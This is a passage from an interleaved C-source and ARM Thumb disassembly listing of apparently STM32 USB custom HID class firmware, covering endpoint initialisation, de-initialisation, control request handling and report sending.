 80088d0:	687a      	ldr	r2, [r7, #4]
 80088d2:	33b0      	adds	r3, #176	; 0xb0
 80088d4:	009b      	lsls	r3, r3, #2
 80088d6:	4413      	add	r3, r2
 80088d8:	685b      	ldr	r3, [r3, #4]
 80088da:	685b      	ldr	r3, [r3, #4]
 80088dc:	4798      	blx	r3

#ifndef USBD_CUSTOMHID_OUT_PREPARE_RECEIVE_DISABLED
  /* Prepare Out endpoint to receive 1st packet */
  (void)USBD_LL_PrepareReceive(pdev, CUSTOMHIDOutEpAdd, hhid->Report_buf,
 80088de:	4b07      	ldr	r3, [pc, #28]	; (80088fc <USBD_CUSTOM_HID_Init+0x154>)
 80088e0:	7819      	ldrb	r1, [r3, #0]
 80088e2:	68fa      	ldr	r2, [r7, #12]
 80088e4:	230f      	movs	r3, #15
 80088e6:	6878      	ldr	r0, [r7, #4]
 80088e8:	f004 fbea 	bl	800d0c0 <USBD_LL_PrepareReceive>
                               USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
#endif /* USBD_CUSTOMHID_OUT_PREPARE_RECEIVE_DISABLED */

  return (uint8_t)USBD_OK;
 80088ec:	2300      	movs	r3, #0
}
 80088ee:	4618      	mov	r0, r3
 80088f0:	3710      	adds	r7, #16
 80088f2:	46bd      	mov	sp, r7
 80088f4:	bd80      	pop	{r7, pc}
 80088f6:	bf00      	nop
 80088f8:	200000a6 	.word	0x200000a6
 80088fc:	200000a7 	.word	0x200000a7

08008900 <USBD_CUSTOM_HID_DeInit>:
  * @param  pdev: device instance
  * @param  cfgidx: Configuration index
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_DeInit(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 8008900:	b580      	push	{r7, lr}
 8008902:	b082      	sub	sp, #8
 8008904:	af00      	add	r7, sp, #0
 8008906:	6078      	str	r0, [r7, #4]
 8008908:	460b      	mov	r3, r1
 800890a:	70fb      	strb	r3, [r7, #3]
  CUSTOMHIDInEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
  CUSTOMHIDOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  /* Close CUSTOM_HID EP IN */
  (void)USBD_LL_CloseEP(pdev, CUSTOMHIDInEpAdd);
 800890c:	4b37      	ldr	r3, [pc, #220]	; (80089ec <USBD_CUSTOM_HID_DeInit+0xec>)
 800890e:	781b      	ldrb	r3, [r3, #0]
 8008910:	4619      	mov	r1, r3
 8008912:	6878      	ldr	r0, [r7, #4]
 8008914:	f004 fa60 	bl	800cdd8 <USBD_LL_CloseEP>
  pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].is_used = 0U;
 8008918:	4b34      	ldr	r3, [pc, #208]	; (80089ec <USBD_CUSTOM_HID_DeInit+0xec>)
 800891a:	781b      	ldrb	r3, [r3, #0]
 800891c:	f003 020f 	and.w	r2, r3, #15
 8008920:	6879      	ldr	r1, [r7, #4]
 8008922:	4613      	mov	r3, r2
 8008924:	009b      	lsls	r3, r3, #2
 8008926:	4413      	add	r3, r2
 8008928:	009b      	lsls	r3, r3, #2
 800892a:	440b      	add	r3, r1
 800892c:	3324      	adds	r3, #36	; 0x24
 800892e:	2200      	movs	r2, #0
 8008930:	801a      	strh	r2, [r3, #0]
  pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].bInterval = 0U;
 8008932:	4b2e      	ldr	r3, [pc, #184]	; (80089ec <USBD_CUSTOM_HID_DeInit+0xec>)
 8008934:	781b      	ldrb	r3, [r3, #0]
 8008936:	f003 020f 	and.w	r2, r3, #15
 800893a:	6879      	ldr	r1, [r7, #4]
 800893c:	4613      	mov	r3, r2
 800893e:	009b      	lsls	r3, r3, #2
 8008940:	4413      	add	r3, r2
 8008942:	009b      	lsls	r3, r3, #2
 8008944:	440b      	add	r3, r1
 8008946:	3326      	adds	r3, #38	; 0x26
 8008948:	2200      	movs	r2, #0
 800894a:	801a      	strh	r2, [r3, #0]

  /* Close CUSTOM_HID EP OUT */
  (void)USBD_LL_CloseEP(pdev, CUSTOMHIDOutEpAdd);
 800894c:	4b28      	ldr	r3, [pc, #160]	; (80089f0 <USBD_CUSTOM_HID_DeInit+0xf0>)
 800894e:	781b      	ldrb	r3, [r3, #0]
 8008950:	4619      	mov	r1, r3
 8008952:	6878      	ldr	r0, [r7, #4]
 8008954:	f004 fa40 	bl	800cdd8 <USBD_LL_CloseEP>
  pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].is_used = 0U;
 8008958:	4b25      	ldr	r3, [pc, #148]	; (80089f0 <USBD_CUSTOM_HID_DeInit+0xf0>)
 800895a:	781b      	ldrb	r3, [r3, #0]
 800895c:	f003 020f 	and.w	r2, r3, #15
 8008960:	6879      	ldr	r1, [r7, #4]
 8008962:	4613      	mov	r3, r2
 8008964:	009b      	lsls	r3, r3, #2
 8008966:	4413      	add	r3, r2
 8008968:	009b      	lsls	r3, r3, #2
 800896a:	440b      	add	r3, r1
 800896c:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 8008970:	2200      	movs	r2, #0
 8008972:	801a      	strh	r2, [r3, #0]
  pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].bInterval = 0U;
 8008974:	4b1e      	ldr	r3, [pc, #120]	; (80089f0 <USBD_CUSTOM_HID_DeInit+0xf0>)
 8008976:	781b      	ldrb	r3, [r3, #0]
 8008978:	f003 020f 	and.w	r2, r3, #15
 800897c:	6879      	ldr	r1, [r7, #4]
 800897e:	4613      	mov	r3, r2
 8008980:	009b      	lsls	r3, r3, #2
 8008982:	4413      	add	r3, r2
 8008984:	009b      	lsls	r3, r3, #2
 8008986:	440b      	add	r3, r1
 8008988:	f503 73b3 	add.w	r3, r3, #358	; 0x166
 800898c:	2200      	movs	r2, #0
 800898e:	801a      	strh	r2, [r3, #0]

  /* Free allocated memory */
  if (pdev->pClassDataCmsit[pdev->classId] != NULL)
 8008990:	687b      	ldr	r3, [r7, #4]
 8008992:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008996:	687b      	ldr	r3, [r7, #4]
 8008998:	32b0      	adds	r2, #176	; 0xb0
 800899a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800899e:	2b00      	cmp	r3, #0
 80089a0:	d01f      	beq.n	80089e2 <USBD_CUSTOM_HID_DeInit+0xe2>
  {
    ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->DeInit();
 80089a2:	687b      	ldr	r3, [r7, #4]
 80089a4:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 80089a8:	687a      	ldr	r2, [r7, #4]
 80089aa:	33b0      	adds	r3, #176	; 0xb0
 80089ac:	009b      	lsls	r3, r3, #2
 80089ae:	4413      	add	r3, r2
 80089b0:	685b      	ldr	r3, [r3, #4]
 80089b2:	689b      	ldr	r3, [r3, #8]
 80089b4:	4798      	blx	r3
    USBD_free(pdev->pClassDataCmsit[pdev->classId]);
 80089b6:	687b      	ldr	r3, [r7, #4]
 80089b8:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80089bc:	687b      	ldr	r3, [r7, #4]
 80089be:	32b0      	adds	r2, #176	; 0xb0
 80089c0:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80089c4:	4618      	mov	r0, r3
 80089c6:	f004 fc19 	bl	800d1fc <USBD_static_free>
    pdev->pClassDataCmsit[pdev->classId] = NULL;
 80089ca:	687b      	ldr	r3, [r7, #4]
 80089cc:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80089d0:	687b      	ldr	r3, [r7, #4]
 80089d2:	32b0      	adds	r2, #176	; 0xb0
 80089d4:	2100      	movs	r1, #0
 80089d6:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
    pdev->pClassData = NULL;
 80089da:	687b      	ldr	r3, [r7, #4]
 80089dc:	2200      	movs	r2, #0
 80089de:	f8c3 22bc 	str.w	r2, [r3, #700]	; 0x2bc
  }

  return (uint8_t)USBD_OK;
 80089e2:	2300      	movs	r3, #0
}
 80089e4:	4618      	mov	r0, r3
 80089e6:	3708      	adds	r7, #8
 80089e8:	46bd      	mov	sp, r7
 80089ea:	bd80      	pop	{r7, pc}
 80089ec:	200000a6 	.word	0x200000a6
 80089f0:	200000a7 	.word	0x200000a7

080089f4 <USBD_CUSTOM_HID_Setup>:
  * @param  req: usb requests
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_Setup(USBD_HandleTypeDef *pdev,
                                     USBD_SetupReqTypedef *req)
{
 80089f4:	b580      	push	{r7, lr}
 80089f6:	b088      	sub	sp, #32
 80089f8:	af00      	add	r7, sp, #0
 80089fa:	6078      	str	r0, [r7, #4]
 80089fc:	6039      	str	r1, [r7, #0]
  USBD_CUSTOM_HID_HandleTypeDef *hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80089fe:	687b      	ldr	r3, [r7, #4]
 8008a00:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008a04:	687b      	ldr	r3, [r7, #4]
 8008a06:	32b0      	adds	r2, #176	; 0xb0
 8008a08:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008a0c:	613b      	str	r3, [r7, #16]
  uint16_t len = 0U;
 8008a0e:	2300      	movs	r3, #0
 8008a10:	83fb      	strh	r3, [r7, #30]
#ifdef USBD_CUSTOMHID_CTRL_REQ_GET_REPORT_ENABLED
  uint16_t ReportLength = 0U;
#endif /* USBD_CUSTOMHID_CTRL_REQ_GET_REPORT_ENABLED */
  uint8_t  *pbuf = NULL;
 8008a12:	2300      	movs	r3, #0
 8008a14:	61bb      	str	r3, [r7, #24]
  uint16_t status_info = 0U;
 8008a16:	2300      	movs	r3, #0
 8008a18:	81fb      	strh	r3, [r7, #14]
  USBD_StatusTypeDef ret = USBD_OK;
 8008a1a:	2300      	movs	r3, #0
 8008a1c:	75fb      	strb	r3, [r7, #23]

  if (hhid == NULL)
 8008a1e:	693b      	ldr	r3, [r7, #16]
 8008a20:	2b00      	cmp	r3, #0
 8008a22:	d101      	bne.n	8008a28 <USBD_CUSTOM_HID_Setup+0x34>
  {
    return (uint8_t)USBD_FAIL;
 8008a24:	2303      	movs	r3, #3
 8008a26:	e0f8      	b.n	8008c1a <USBD_CUSTOM_HID_Setup+0x226>
  }

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 8008a28:	683b      	ldr	r3, [r7, #0]
 8008a2a:	781b      	ldrb	r3, [r3, #0]
 8008a2c:	f003 0360 	and.w	r3, r3, #96	; 0x60
 8008a30:	2b00      	cmp	r3, #0
 8008a32:	d056      	beq.n	8008ae2 <USBD_CUSTOM_HID_Setup+0xee>
 8008a34:	2b20      	cmp	r3, #32
 8008a36:	f040 80e8 	bne.w	8008c0a <USBD_CUSTOM_HID_Setup+0x216>
  {
    case USB_REQ_TYPE_CLASS:
      switch (req->bRequest)
 8008a3a:	683b      	ldr	r3, [r7, #0]
 8008a3c:	785b      	ldrb	r3, [r3, #1]
 8008a3e:	3b02      	subs	r3, #2
 8008a40:	2b09      	cmp	r3, #9
 8008a42:	d846      	bhi.n	8008ad2 <USBD_CUSTOM_HID_Setup+0xde>
 8008a44:	a201      	add	r2, pc, #4	; (adr r2, 8008a4c <USBD_CUSTOM_HID_Setup+0x58>)
 8008a46:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8008a4a:	bf00      	nop
 8008a4c:	08008aa5 	.word	0x08008aa5
 8008a50:	08008a83 	.word	0x08008a83
 8008a54:	08008ad3 	.word	0x08008ad3
 8008a58:	08008ad3 	.word	0x08008ad3
 8008a5c:	08008ad3 	.word	0x08008ad3
 8008a60:	08008ad3 	.word	0x08008ad3
 8008a64:	08008ad3 	.word	0x08008ad3
 8008a68:	08008ab5 	.word	0x08008ab5
 8008a6c:	08008a93 	.word	0x08008a93
 8008a70:	08008a75 	.word	0x08008a75
      {
        case CUSTOM_HID_REQ_SET_PROTOCOL:
          hhid->Protocol = (uint8_t)(req->wValue);
 8008a74:	683b      	ldr	r3, [r7, #0]
 8008a76:	885b      	ldrh	r3, [r3, #2]
 8008a78:	b2db      	uxtb	r3, r3
 8008a7a:	461a      	mov	r2, r3
 8008a7c:	693b      	ldr	r3, [r7, #16]
 8008a7e:	611a      	str	r2, [r3, #16]
          break;
 8008a80:	e02e      	b.n	8008ae0 <USBD_CUSTOM_HID_Setup+0xec>

        case CUSTOM_HID_REQ_GET_PROTOCOL:
          (void)USBD_CtlSendData(pdev, (uint8_t *)&hhid->Protocol, 1U);
 8008a82:	693b      	ldr	r3, [r7, #16]
 8008a84:	3310      	adds	r3, #16
 8008a86:	2201      	movs	r2, #1
 8008a88:	4619      	mov	r1, r3
 8008a8a:	6878      	ldr	r0, [r7, #4]
 8008a8c:	f003 fd0e 	bl	800c4ac <USBD_CtlSendData>
          break;
 8008a90:	e026      	b.n	8008ae0 <USBD_CUSTOM_HID_Setup+0xec>

        case CUSTOM_HID_REQ_SET_IDLE:
          hhid->IdleState = (uint8_t)(req->wValue >> 8);
 8008a92:	683b      	ldr	r3, [r7, #0]
 8008a94:	885b      	ldrh	r3, [r3, #2]
 8008a96:	0a1b      	lsrs	r3, r3, #8
 8008a98:	b29b      	uxth	r3, r3
 8008a9a:	b2db      	uxtb	r3, r3
 8008a9c:	461a      	mov	r2, r3
 8008a9e:	693b      	ldr	r3, [r7, #16]
 8008aa0:	615a      	str	r2, [r3, #20]
          break;
 8008aa2:	e01d      	b.n	8008ae0 <USBD_CUSTOM_HID_Setup+0xec>

        case CUSTOM_HID_REQ_GET_IDLE:
          (void)USBD_CtlSendData(pdev, (uint8_t *)&hhid->IdleState, 1U);
 8008aa4:	693b      	ldr	r3, [r7, #16]
 8008aa6:	3314      	adds	r3, #20
 8008aa8:	2201      	movs	r2, #1
 8008aaa:	4619      	mov	r1, r3
 8008aac:	6878      	ldr	r0, [r7, #4]
 8008aae:	f003 fcfd 	bl	800c4ac <USBD_CtlSendData>
          break;
 8008ab2:	e015      	b.n	8008ae0 <USBD_CUSTOM_HID_Setup+0xec>
            ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->CtrlReqComplete(req->bRequest,
                                                                                            req->wLength);
          }
#endif /* USBD_CUSTOMHID_CTRL_REQ_COMPLETE_CALLBACK_ENABLED */
#ifndef USBD_CUSTOMHID_EP0_OUT_PREPARE_RECEIVE_DISABLED
          hhid->IsReportAvailable = 1U;
 8008ab4:	693b      	ldr	r3, [r7, #16]
 8008ab6:	2201      	movs	r2, #1
 8008ab8:	61da      	str	r2, [r3, #28]
          (void)USBD_CtlPrepareRx(pdev, hhid->Report_buf,
 8008aba:	6939      	ldr	r1, [r7, #16]
                                  MIN(req->wLength, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE));
 8008abc:	683b      	ldr	r3, [r7, #0]
 8008abe:	88db      	ldrh	r3, [r3, #6]
 8008ac0:	2b0f      	cmp	r3, #15
 8008ac2:	bf28      	it	cs
 8008ac4:	230f      	movcs	r3, #15
 8008ac6:	b29b      	uxth	r3, r3
          (void)USBD_CtlPrepareRx(pdev, hhid->Report_buf,
 8008ac8:	461a      	mov	r2, r3
 8008aca:	6878      	ldr	r0, [r7, #4]
 8008acc:	f003 fd1a 	bl	800c504 <USBD_CtlPrepareRx>
#endif /* USBD_CUSTOMHID_EP0_OUT_PREPARE_RECEIVE_DISABLED */
          break;
 8008ad0:	e006      	b.n	8008ae0 <USBD_CUSTOM_HID_Setup+0xec>
          }
          break;
#endif /* USBD_CUSTOMHID_CTRL_REQ_GET_REPORT_ENABLED */

        default:
          USBD_CtlError(pdev, req);
 8008ad2:	6839      	ldr	r1, [r7, #0]
 8008ad4:	6878      	ldr	r0, [r7, #4]
 8008ad6:	f003 fc78 	bl	800c3ca <USBD_CtlError>
          ret = USBD_FAIL;
 8008ada:	2303      	movs	r3, #3
 8008adc:	75fb      	strb	r3, [r7, #23]
          break;
 8008ade:	bf00      	nop
      }
      break;
 8008ae0:	e09a      	b.n	8008c18 <USBD_CUSTOM_HID_Setup+0x224>

    case USB_REQ_TYPE_STANDARD:
      switch (req->bRequest)
 8008ae2:	683b      	ldr	r3, [r7, #0]
 8008ae4:	785b      	ldrb	r3, [r3, #1]
 8008ae6:	2b0b      	cmp	r3, #11
 8008ae8:	f200 8086 	bhi.w	8008bf8 <USBD_CUSTOM_HID_Setup+0x204>
 8008aec:	a201      	add	r2, pc, #4	; (adr r2, 8008af4 <USBD_CUSTOM_HID_Setup+0x100>)
 8008aee:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8008af2:	bf00      	nop
 8008af4:	08008b25 	.word	0x08008b25
 8008af8:	08008c07 	.word	0x08008c07
 8008afc:	08008bf9 	.word	0x08008bf9
 8008b00:	08008bf9 	.word	0x08008bf9
 8008b04:	08008bf9 	.word	0x08008bf9
 8008b08:	08008bf9 	.word	0x08008bf9
 8008b0c:	08008b4f 	.word	0x08008b4f
 8008b10:	08008bf9 	.word	0x08008bf9
 8008b14:	08008bf9 	.word	0x08008bf9
 8008b18:	08008bf9 	.word	0x08008bf9
 8008b1c:	08008ba7 	.word	0x08008ba7
 8008b20:	08008bd1 	.word	0x08008bd1
      {
        case USB_REQ_GET_STATUS:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8008b24:	687b      	ldr	r3, [r7, #4]
 8008b26:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8008b2a:	b2db      	uxtb	r3, r3
 8008b2c:	2b03      	cmp	r3, #3
 8008b2e:	d107      	bne.n	8008b40 <USBD_CUSTOM_HID_Setup+0x14c>
          {
            (void)USBD_CtlSendData(pdev, (uint8_t *)&status_info, 2U);
 8008b30:	f107 030e 	add.w	r3, r7, #14
 8008b34:	2202      	movs	r2, #2
 8008b36:	4619      	mov	r1, r3
 8008b38:	6878      	ldr	r0, [r7, #4]
 8008b3a:	f003 fcb7 	bl	800c4ac <USBD_CtlSendData>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8008b3e:	e063      	b.n	8008c08 <USBD_CUSTOM_HID_Setup+0x214>
            USBD_CtlError(pdev, req);
 8008b40:	6839      	ldr	r1, [r7, #0]
 8008b42:	6878      	ldr	r0, [r7, #4]
 8008b44:	f003 fc41 	bl	800c3ca <USBD_CtlError>
            ret = USBD_FAIL;
 8008b48:	2303      	movs	r3, #3
 8008b4a:	75fb      	strb	r3, [r7, #23]
          break;
 8008b4c:	e05c      	b.n	8008c08 <USBD_CUSTOM_HID_Setup+0x214>

        case USB_REQ_GET_DESCRIPTOR:
          if ((req->wValue >> 8) == CUSTOM_HID_REPORT_DESC)
 8008b4e:	683b      	ldr	r3, [r7, #0]
 8008b50:	885b      	ldrh	r3, [r3, #2]
 8008b52:	0a1b      	lsrs	r3, r3, #8
 8008b54:	b29b      	uxth	r3, r3
 8008b56:	2b22      	cmp	r3, #34	; 0x22
 8008b58:	d110      	bne.n	8008b7c <USBD_CUSTOM_HID_Setup+0x188>
          {
            len = MIN(USBD_CUSTOM_HID_REPORT_DESC_SIZE, req->wLength);
 8008b5a:	683b      	ldr	r3, [r7, #0]
 8008b5c:	88db      	ldrh	r3, [r3, #6]
 8008b5e:	2b49      	cmp	r3, #73	; 0x49
 8008b60:	bf28      	it	cs
 8008b62:	2349      	movcs	r3, #73	; 0x49
 8008b64:	83fb      	strh	r3, [r7, #30]
            pbuf = ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->pReport;
 8008b66:	687b      	ldr	r3, [r7, #4]
 8008b68:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008b6c:	687a      	ldr	r2, [r7, #4]
 8008b6e:	33b0      	adds	r3, #176	; 0xb0
 8008b70:	009b      	lsls	r3, r3, #2
 8008b72:	4413      	add	r3, r2
 8008b74:	685b      	ldr	r3, [r3, #4]
 8008b76:	681b      	ldr	r3, [r3, #0]
 8008b78:	61bb      	str	r3, [r7, #24]
 8008b7a:	e00d      	b.n	8008b98 <USBD_CUSTOM_HID_Setup+0x1a4>
          }
          else
          {
            if ((req->wValue >> 8) == CUSTOM_HID_DESCRIPTOR_TYPE)
 8008b7c:	683b      	ldr	r3, [r7, #0]
 8008b7e:	885b      	ldrh	r3, [r3, #2]
 8008b80:	0a1b      	lsrs	r3, r3, #8
 8008b82:	b29b      	uxth	r3, r3
 8008b84:	2b21      	cmp	r3, #33	; 0x21
 8008b86:	d107      	bne.n	8008b98 <USBD_CUSTOM_HID_Setup+0x1a4>
            {
              pbuf = USBD_CUSTOM_HID_Desc;
 8008b88:	4b26      	ldr	r3, [pc, #152]	; (8008c24 <USBD_CUSTOM_HID_Setup+0x230>)
 8008b8a:	61bb      	str	r3, [r7, #24]
              len = MIN(USB_CUSTOM_HID_DESC_SIZ, req->wLength);
 8008b8c:	683b      	ldr	r3, [r7, #0]
 8008b8e:	88db      	ldrh	r3, [r3, #6]
 8008b90:	2b09      	cmp	r3, #9
 8008b92:	bf28      	it	cs
 8008b94:	2309      	movcs	r3, #9
 8008b96:	83fb      	strh	r3, [r7, #30]
            }
          }

          (void)USBD_CtlSendData(pdev, pbuf, len);
 8008b98:	8bfb      	ldrh	r3, [r7, #30]
 8008b9a:	461a      	mov	r2, r3
 8008b9c:	69b9      	ldr	r1, [r7, #24]
 8008b9e:	6878      	ldr	r0, [r7, #4]
 8008ba0:	f003 fc84 	bl	800c4ac <USBD_CtlSendData>
          break;
 8008ba4:	e030      	b.n	8008c08 <USBD_CUSTOM_HID_Setup+0x214>

        case USB_REQ_GET_INTERFACE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8008ba6:	687b      	ldr	r3, [r7, #4]
 8008ba8:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8008bac:	b2db      	uxtb	r3, r3
 8008bae:	2b03      	cmp	r3, #3
 8008bb0:	d107      	bne.n	8008bc2 <USBD_CUSTOM_HID_Setup+0x1ce>
          {
            (void)USBD_CtlSendData(pdev, (uint8_t *)&hhid->AltSetting, 1U);
 8008bb2:	693b      	ldr	r3, [r7, #16]
 8008bb4:	3318      	adds	r3, #24
 8008bb6:	2201      	movs	r2, #1
 8008bb8:	4619      	mov	r1, r3
 8008bba:	6878      	ldr	r0, [r7, #4]
 8008bbc:	f003 fc76 	bl	800c4ac <USBD_CtlSendData>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8008bc0:	e022      	b.n	8008c08 <USBD_CUSTOM_HID_Setup+0x214>
            USBD_CtlError(pdev, req);
 8008bc2:	6839      	ldr	r1, [r7, #0]
 8008bc4:	6878      	ldr	r0, [r7, #4]
 8008bc6:	f003 fc00 	bl	800c3ca <USBD_CtlError>
            ret = USBD_FAIL;
 8008bca:	2303      	movs	r3, #3
 8008bcc:	75fb      	strb	r3, [r7, #23]
          break;
 8008bce:	e01b      	b.n	8008c08 <USBD_CUSTOM_HID_Setup+0x214>

        case USB_REQ_SET_INTERFACE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8008bd0:	687b      	ldr	r3, [r7, #4]
 8008bd2:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8008bd6:	b2db      	uxtb	r3, r3
 8008bd8:	2b03      	cmp	r3, #3
 8008bda:	d106      	bne.n	8008bea <USBD_CUSTOM_HID_Setup+0x1f6>
          {
            hhid->AltSetting = (uint8_t)(req->wValue);
 8008bdc:	683b      	ldr	r3, [r7, #0]
 8008bde:	885b      	ldrh	r3, [r3, #2]
 8008be0:	b2db      	uxtb	r3, r3
 8008be2:	461a      	mov	r2, r3
 8008be4:	693b      	ldr	r3, [r7, #16]
 8008be6:	619a      	str	r2, [r3, #24]
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8008be8:	e00e      	b.n	8008c08 <USBD_CUSTOM_HID_Setup+0x214>
            USBD_CtlError(pdev, req);
 8008bea:	6839      	ldr	r1, [r7, #0]
 8008bec:	6878      	ldr	r0, [r7, #4]
 8008bee:	f003 fbec 	bl	800c3ca <USBD_CtlError>
            ret = USBD_FAIL;
 8008bf2:	2303      	movs	r3, #3
 8008bf4:	75fb      	strb	r3, [r7, #23]
          break;
 8008bf6:	e007      	b.n	8008c08 <USBD_CUSTOM_HID_Setup+0x214>

        case USB_REQ_CLEAR_FEATURE:
          break;

        default:
          USBD_CtlError(pdev, req);
 8008bf8:	6839      	ldr	r1, [r7, #0]
 8008bfa:	6878      	ldr	r0, [r7, #4]
 8008bfc:	f003 fbe5 	bl	800c3ca <USBD_CtlError>
          ret = USBD_FAIL;
 8008c00:	2303      	movs	r3, #3
 8008c02:	75fb      	strb	r3, [r7, #23]
          break;
 8008c04:	e000      	b.n	8008c08 <USBD_CUSTOM_HID_Setup+0x214>
          break;
 8008c06:	bf00      	nop
      }
      break;
 8008c08:	e006      	b.n	8008c18 <USBD_CUSTOM_HID_Setup+0x224>

    default:
      USBD_CtlError(pdev, req);
 8008c0a:	6839      	ldr	r1, [r7, #0]
 8008c0c:	6878      	ldr	r0, [r7, #4]
 8008c0e:	f003 fbdc 	bl	800c3ca <USBD_CtlError>
      ret = USBD_FAIL;
 8008c12:	2303      	movs	r3, #3
 8008c14:	75fb      	strb	r3, [r7, #23]
      break;
 8008c16:	bf00      	nop
  }
  return (uint8_t)ret;
 8008c18:	7dfb      	ldrb	r3, [r7, #23]
}
 8008c1a:	4618      	mov	r0, r3
 8008c1c:	3720      	adds	r7, #32
 8008c1e:	46bd      	mov	sp, r7
 8008c20:	bd80      	pop	{r7, pc}
 8008c22:	bf00      	nop
 8008c24:	20000090 	.word	0x20000090

08008c28 <USBD_CUSTOM_HID_SendReport>:
{
  USBD_CUSTOM_HID_HandleTypeDef *hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[ClassId];
#else
uint8_t USBD_CUSTOM_HID_SendReport(USBD_HandleTypeDef *pdev,
                                   uint8_t *report, uint16_t len)
{
 8008c28:	b580      	push	{r7, lr}
 8008c2a:	b086      	sub	sp, #24
 8008c2c:	af00      	add	r7, sp, #0
 8008c2e:	60f8      	str	r0, [r7, #12]
 8008c30:	60b9      	str	r1, [r7, #8]
 8008c32:	4613      	mov	r3, r2
 8008c34:	80fb      	strh	r3, [r7, #6]
  USBD_CUSTOM_HID_HandleTypeDef *hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008c36:	68fb      	ldr	r3, [r7, #12]
 8008c38:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008c3c:	68fb      	ldr	r3, [r7, #12]
 8008c3e:	32b0      	adds	r2, #176	; 0xb0
 8008c40:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008c44:	617b      	str	r3, [r7, #20]
#endif /* USE_USBD_COMPOSITE */

  if (hhid == NULL)
 8008c46:	697b      	ldr	r3, [r7, #20]
 8008c48:	2b00      	cmp	r3, #0
 8008c4a:	d101      	bne.n	8008c50 <USBD_CUSTOM_HID_SendReport+0x28>
  {
    return (uint8_t)USBD_FAIL;
 8008c4c:	2303      	movs	r3, #3
 8008c4e:	e019      	b.n	8008c84 <USBD_CUSTOM_HID_SendReport+0x5c>
#ifdef USE_USBD_COMPOSITE
  /* Get Endpoint IN address allocated for this class instance */
  CUSTOMHIDInEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_INTR, ClassId);
#endif /* USE_USBD_COMPOSITE */

  if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8008c50:	68fb      	ldr	r3, [r7, #12]
 8008c52:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8008c56:	b2db      	uxtb	r3, r3
 8008c58:	2b03      	cmp	r3, #3
 8008c5a:	d112      	bne.n	8008c82 <USBD_CUSTOM_HID_SendReport+0x5a>
  {
    if (hhid->state == CUSTOM_HID_IDLE)
 8008c5c:	697b      	ldr	r3, [r7, #20]
 8008c5e:	f893 3020 	ldrb.w	r3, [r3, #32]
 8008c62:	2b00      	cmp	r3, #0
 8008c64:	d10b      	bne.n	8008c7e <USBD_CUSTOM_HID_SendReport+0x56>
    {
      hhid->state = CUSTOM_HID_BUSY;
 8008c66:	697b      	ldr	r3, [r7, #20]
 8008c68:	2201      	movs	r2, #1
 8008c6a:	f883 2020 	strb.w	r2, [r3, #32]
      (void)USBD_LL_Transmit(pdev, CUSTOMHIDInEpAdd, report, len);
 8008c6e:	4b07      	ldr	r3, [pc, #28]	; (8008c8c <USBD_CUSTOM_HID_SendReport+0x64>)
 8008c70:	7819      	ldrb	r1, [r3, #0]
 8008c72:	88fb      	ldrh	r3, [r7, #6]
 8008c74:	68ba      	ldr	r2, [r7, #8]
 8008c76:	68f8      	ldr	r0, [r7, #12]
 8008c78:	f004 f9ea 	bl	800d050 <USBD_LL_Transmit>
 8008c7c:	e001      	b.n	8008c82 <USBD_CUSTOM_HID_SendReport+0x5a>
    }
    else
    {
      return (uint8_t)USBD_BUSY;
 8008c7e:	2301      	movs	r3, #1
 8008c80:	e000      	b.n	8008c84 <USBD_CUSTOM_HID_SendReport+0x5c>
    }
  }
  return (uint8_t)USBD_OK;
 8008c82:	2300      	movs	r3, #0
}
 8008c84:	4618      	mov	r0, r3
 8008c86:	3718      	adds	r7, #24
 8008c88:	46bd      	mov	sp, r7
 8008c8a:	bd80      	pop	{r7, pc}
